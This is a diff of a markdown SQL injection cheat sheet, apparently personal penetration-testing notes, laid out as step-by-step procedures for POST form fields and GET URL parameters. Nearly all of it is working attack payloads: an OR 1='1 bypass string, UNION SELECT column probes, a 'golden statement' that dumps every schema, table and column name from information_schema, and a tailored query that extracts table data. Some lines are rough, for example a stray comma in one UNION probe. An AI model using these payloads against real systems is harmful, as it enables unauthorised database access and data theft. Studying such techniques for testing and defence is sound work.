@@ -465,24 +465,30 @@ Can be found using a Single Quote => '
 
 
 # POST Method (Interacting with input fields)
+### step 1: Determine the vulnerable field
+### step 2: Identify number of columns
+### step 3: Edit Golden Statement to Dump DataBases (Gives you the database,tables and columns)
+### step 4: Craft more tailored queries
 
 
-step 1: Determine the vulnerable field
-step 2: Test all options avaialble
-step 3: Leverage vulnerable field
+## step 1: Determine the vulnerable field
 ```{option}' OR 1='1```
-step 5: Identify number of columns
+## step 2: Identify number of columns
 ```
 {option}' UNION SELECT 1,2,3,4 #
 {option}' UNION SELECT 1,2,3,4,5 #
 ```
-* 4 columns displayed, column 2 hidden
- step 6: Golden Statement
-UNION SELECT table_schema,table_name,column_name from information_schema.columns #
+## step 3: Edit Golden Statement to Dump DataBases (Gives you the database,tables and columns)
 
+* 4 columns displayed, column 2 hidden
+```
+UNION SELECT table_schema,table_name,column_name from information_schema.columns #
+```
 ```
 UNION SELECT table_schema,2,table_name,column_name,5 from information_schema.columns #
 ```
+## step 4:  Craft more tailored queries
+
 ```
 '{option:Audi} 'UNION SELECT TYPE,2,cost,color,year from session.car #'
 ```
@@ -522,16 +528,32 @@ session |	userinfo 	prid 		5
 
 # GET Method (Interact with URL)
 
+### step 1: Determine the vulnerable field
+### step 2: Identify number of columns
+### step 3: Edit Golden Statement to Dump DataBases (Gives you the database,tables and columns)
+### step 4:  Craft more tailored queries
+
+## step 1: Determine the vulnerable field
 - Choose {option} from radio button, then click submit
   - interact with url:
+```
+{Selection}=4 OR 1=1 (for each selection 1..4)
+```
 
-``` Section=4 OR 1=1 (for each selection 1..4) ```
 
-``` Selection=2 UNION, SELECT 1,2,3 ```
+## step 2: Identify number of columns
+``` 
+Selection=2 UNION, SELECT 1,2,3
+```
 
-``` UNION SELECT table_schema,table_name,column_name from information_schema.columns ```
-
-``` UNION SELECT table_schema,column_name,table_name from information_schema.columns ```
+## step 3: Edit Golden Statement to Dump DataBases (Gives you the database,tables and columns)
+``` 
+UNION SELECT table_schema,table_name,column_name from information_schema.columns
+```
+## step 4:  Craft more tailored queries
+``` 
+UNION SELECT table_schema,column_name,table_name from information_schema.columns
+```
 
 
 
